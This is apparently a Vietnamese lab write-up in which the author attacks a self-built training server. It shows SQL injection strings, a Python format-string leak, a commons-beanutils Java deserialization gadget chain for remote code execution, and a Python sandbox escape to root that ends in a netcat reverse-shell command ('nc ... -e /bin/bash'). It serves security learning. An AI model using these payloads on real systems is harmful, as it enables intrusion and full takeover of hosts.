---
title: "[My Lab] Writeup My Lab 1 (Java Deserialization, Python Sandbox Escape)"
date: 2022-02-24T18:17:00+07:00
draft: false
categories: [
    "Offensive Security",
    "Lab"
]
tags: [
    "Java", "Privilege Escalation", "Python"
]
---

### Overview
Địa chỉ: 10.14.140.127\
Bài Lab được tạo ra với mục đích cho bản thân và mọi người trong teamtontac của tôi nghiên cứu, học tập về các lỗ hổng bảo mật và  phát triển bản thân.
- 1 – Khai thác lỗ hổng Java Deserialization trên port 8081 để lấy shell datmom
- 2 – Từ datmom escape python sandbox để leo thang lên root.

Ngoài ra còn 1 số dịch vụ khác đóng vai trò làm rabbit hole (SQLInjection, SSTI).
### Rabbit hole
Sử dụng nmap scan nhanh ta thấy được các port dịch vụ đang open trên máy chủ:
![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/1.jpg)

**Port 80**

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/2.jpg)

Một ứng dụng web đang chạy trên port 80 cho phép chúng ta tìm kiếm thông tin nhân viên của CMC Infosec dựa vào user id do người dùng nhập vào:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/3.jpg)

Ta dễ dang detect được trang web bị ảnh hưởng bởi lỗ hổng SQL Injection chỉ với việc chèn thêm dấu nháy (') để phá vỡ câu truy vấn SQL:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/4.jpg)

Vì đây là chức năng tìm kiếm thông tin user dựa vào user id người dùng nhập vào. Nên ta có thể suy luận câu truy vấn SQL có thể như sau: \
```SELECT id, full_name FROM users WHERE id LIKE '$id'```

Tiến hành dump all user ( ```' or 1=1 -- -``` ):

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/5.jpg)

Sử dụng Sqlmap để dump all DB:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/6.jpg)

Dump DB cmc_db:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/7.jpg)

Dump DB secret:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/8.jpg)

Không có nội dung đặc biệt và có thể lợi dụng được từ DB

Trích xuất version hệ quản trị CSDL: ```1' union select null,@@version -- -```

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/9.jpg)

Không thể sử dụng union kết hợp into outfile để get shell vì webroot đã được custom và user cũng không có quyền ghi vào thư mục webroot.

**Port 9090**

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/10.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/11.jpg)

Check source code ta biết được dịch vụ đang chạy trên port này là cockpit.

https://github.com/cockpit-project/cockpit 

Chỉ là 1 GUI management giúp quản lý OS -> Không có khả năng khai thác

**Port 9988**

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/12.jpg)

Đây là 1 service tự custom là CMC memcat. Source code được cung cấp trước có sẵn tại:

http://10.14.140.127/memcat_server.py

Ta thấy service hoạt động như một STACK cho phép PUSH, POP và DELETE data.

Hiển thị dữ liệu cho người dùng sử dụng **.format** (là một template có sẵn của Python)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/13.jpg)

Vì vậy ở đây có thể bị ảnh hưởng bởi lỗ hổng SSTI (Server Side Template Injection). Có thể khai thác khi chúng ta kiểm soát được khung của đầu ra dữ liệu.

Ta thấy ở đây hầu hết các output đều được fix cứng và không thể khai thác:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/14.jpg)

Xem kĩ tính năng DELETE với len(parsed_data) là 3 ta thấy:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/15.jpg)

Ở đây ta có thể kiểm soát được ```{val.value}``` là giá trị ta PUSH vào từ trước. Khi len(parsed_data) là 3 service sẽ in ra giá trị đó cho biết chi tiết của key cần delete:

Payload: ```{val.__init__.__globals__}``` (show ra toàn bộ biến global)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/16.jpg)

Chúng ta có hint: "Thank for your efforts!\nPort 8081 is the only way!\n"

Thực tế chúng ta cũng không thể khai thác để chạy một lệnh tuỳ ý trên server vì .format trong python không cho phép gọi đến hàm, function khác. 

### Foothold with Java deserialization
#### Recon
Khi truy cập vào máy chủ trên port 8081. Mặc định server cho ta download 1 file:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/17.jpg)

Với nội dung:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/18.jpg)

Dựa vào header Content-Disposition ta có thể thấy được tên file là đường dẫn file: ```logs/info/info.2021-08-22.log```

Server trả về lỗi logname:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/19.jpg)

Lúc này ta có thể thử thay đổi logname:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/20.jpg)

Việc đổi logname vẫn trả về lỗi, nhưng có thể thấy rằng tên file đã thay đổi thực sự là tên file log, vì vậy nó có thể được chia theo ngày -> ta thay thế thành năm, tháng và ngày hôm nay.

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/21.jpg)

Ta thấy file log được đọc thành công .Theo nội dung của file, có thể thấy rằng web sử dụng springboot, và tên gói jar tương ứng là **cb-0.0.1- SNAPSHOT.jar**

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/22.jpg)

Thử tải xuống jar file:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/23.jpg)

Thành công tải về jar file -> Decompile để xem source

Ở đây sử dụng JadX

Xử lý chính:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/24.jpg)

Ở đây ta tìm thấy được 1 API ẩn cho phép deserialize User từ request do người dùng gửi lên được mã hoá base64 sử dụng hàm **readObject()**

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/25.jpg)

API endpoint:  **/bZdWASYu4nN3obRiLpqKCeS8erTZrdxx/parseUser**

Điều này cho phép chúng ta tận dụng để có thể khai khác lỗ hổng Java Deserialization
#### Exploit
File **pom.xml** là nơi khai báo tất cả những gì liên quan đến dự án được cấu hình qua maven, như khai báo các dependency, version của dự án, tên dự án, repossitory … 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/26.jpg)

Từ pom.xml ta biết được project sử dụng thư viện **commons-beanutils 1.8.2**

Đây là 1  thư viện chứa một gadget chain có thể dẫn tới thực thi mã tuỳ ý trên máy chủ thông qua lỗ hổng Java Deserialization đã được phát hiện từ trước.

Ysoserial là bột cộ công cụ nổi tiếng cho phép chúng ta gen payload Java Deserialization một cách tự động.

https://github.com/frohoff/ysoserial 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/27.jpg)

Ở đây Ysoserial bao gồm cả payload liên quan đến thư viện commons-beanutils. Nhưng khi xem kĩ hơn phần code được sử dụng để gen payload cho thư viện này của ysoserial ta thấy: 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/28.jpg)

Ngoài việc sử dụng commons-beanutils, payload ysoserial tạo ra cũng cần **commons-collections** và **commons-logging** để có thể hoàn thiện chain. Mà trong dự án lại không có thêm 2 gói phụ thuộc này.

Vậy chúng ta không thể sử dụng công cụ này để tạo payload giúp RCE máy chủ. Chúng ta chỉ có thể tự viết code gen payload chỉ bao gồm commons-beanutils và các thư viện chuẩn của java để tạo payload giúp RCE máy chủ.

Như đã được phân tích kĩ trong bài viết : https://tranquac.com/posts/2022/01/java-deserialization-commonsbeanutils1-exploit-chain-analysis/ 

Gadget chain có trong thư viện này sẽ như sau: 

```java
ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                siftDownUsingComparator()
                    BeanComparator.compare()
                        TemplatesImpl.getOutputProperties()
                            TemplatesImpl.newTransformer()
                                TemplatesImpl.getTransletInstance()
                                    TemplatesImpl.defineTransletClasses()
                                        TemplatesImpl.TransletClassLoader.defineClass()
                                            Pwner*(Javassist-generated).<static init>
                                                Runtime.exec()
```

Như đã được phân tích trong bài viết: 

PropertyUtils.getProperty(o1, property) : Khi o1 được truyền vào là một TemplatesImpl object và property có giá trị là outputProperties, phương thức getter sẽ tự động gọi để thực thi phương thức TemplatesImpl#getOutputProperties(). Trong nội bộ TemplatesImpl#getOutputProperties() nó lại gọi đến newTransformer(). Mà TemplatesImpl#newTransformer() thường được sử dụng để thực thi bytecodes độc hại. Nhiệm vụ của chúng ta là tạo bytecode độc hại mà giúp RCE máy chủ để truyền vào đối tượng  TemplatesImpl giúp hoàn thành chain

Tạo một đối tượng TemplatesImpl thực thi bytecode độc hại: 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/29.jpg)

TargetByteCodes chính là bytecode độc hại được tạo ra bằng cách:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/30.jpg)

Tạo ra một class từ String command truyền vào -> biến đổi class đó thành mảng byte tương ứng kiểu để truyền vào TemplatesImpl

Rồi gọi đến hàm getPayload để tạo payload -> Encode base64 để truyền lên server

Thay thế + thành “%2b” để tránh lỗi kí tự khi xử lý trên server:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/31.jpg)

Sau khi chạy nhận được payload:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/32.jpg)

=> Send request:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/33.jpg)

Ngoài ra ta cũng có thể sử dụng một cách khác. Vì ứng dụng sử dụng spring boot. Nên ta sẽ tạo class **SpringEcho** có tác dụng nhận một **Header cmd** mỗi request. Thực thi **cmd** đó và trả lại response. Như vậy mỗi lần thực thi một lệnh khác nhau ta sẽ không cần phải gen lại payload nữa:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/34.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/35.jpg)

Tham khảo:

https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsBeanutils1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0.md

https://github.com/SummerSec/JavaLearnVulnerability/blob/master/Rce_Echo/TomcatEcho/src/main/java/summersec/echo/Controller/SpringEcho.java 

Thảo khảo toàn bộ source tại: http://103.81.86.132/source.rar 

### Datmom to root with Python escape sandbox
Sau khi lấy được shell của user datmom. Sử dụng sudo -l ta thấy user datmom có thể chạy 2 command với đặc quyền của root 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/36.jpg)

Command đầu tiên không thể được lợi dụng để leo thang đặc quyền

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/37.jpg)

Vì để lấy được shell phải chờ một khoảng thời gian rất lâu, cũng không có input hay untrusted data nào có thể lợi dụng được

Lệnh thứ 2 cho phép ta mở một sandbox python dưới đặc quyền của root

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/38.jpg)

Mục tiêu là từ sandbox làm sao ta có thể thực thi được os command lấy được shell root.

Nội dung es2.py

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/39.jpg)

Ở đây. Sandbox đã được xoá hết func, lib mà ta có thể lợi dụng để gọi OS command: import, exec, eval, os …

Nếu lệnh của chúng ta không chứa những từ khoá này thì sẽ được thực thi. Còn không thì sẽ đưa ra cảnh báo:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/40.jpg)

Vì vậy làm sao để có thể thực thi được os command từ sandbox này?

Khi chúng ta không  thể import modules hay những modules mà chúng ta muốn import bị cấm. 

Ý tưởng tương tự khi chúng ta khai thác lỗ hổng SSTI. Được biết mỗi đối tượng trong python đều có các properties, method ẩn. Liệu từ những properties hay method ẩn này chúng ta có thể làm một điều gì đó lớn lao?

Ví dụ một payload giúp escape sandbox này:

```print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('nc 127.0.0.1 4444 -e /bin/bash'))```

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/41.jpg)

Chúng ta hãy cùng đi sâu 1 chút để hiểu hơn về payload này hoạt động ra sao:

Khi làm SSTI tôi thường quan tâm đến method __init__ khi nó xuất hiên, là một method thú vị, từ nó chúng ta hay có thể làm được 1 điều gì đó thú vị như: in ra toàn bộ biến globals, RCE …

() được biết đến như cách khai báo một tuple trong python

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/42.jpg)

Sử dụng dir để xem toàn bộ properties hay method ẩn của 1 tuple

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/43.jpg)

```.__class__``` ( is a reference to the type of the current instance)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/44.jpg)

Kiên trì tìm kiếm bằng cách sử dụng dump hay tìm kiếm 1 payload mà đã được tìm ra trước đó. Ta có thể thấy ```__init__``` xuất hiện tại:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/45.jpg)

Tiếp tục đi sâu vào ```__init__``` ta sẽ tìm thấy một con đường giúp chúng ta gọi đến được os lib bằng cách sử dụng ```func_globals['linecache']``` có trong ```__init__```

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/46.jpg)

YES. Nhưng để tránh keyword **os** đã bị cấm. Ta sẽ gọi đến nó bằng cách cộng 2 chuối “o” và “s”. Trong os gọi tiếp đến “system” và giờ có thể run os command tuỳ ý.

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/47.jpg)

Có rất nhiều payload khác cũng có thể giúp ta đạt được mục tiêu cuối cùng. Mọi người có thể tìm hiểu thêm và phân tích để hiểu rõ hơn.

Cảm ơn vì đã đọc tới đây!





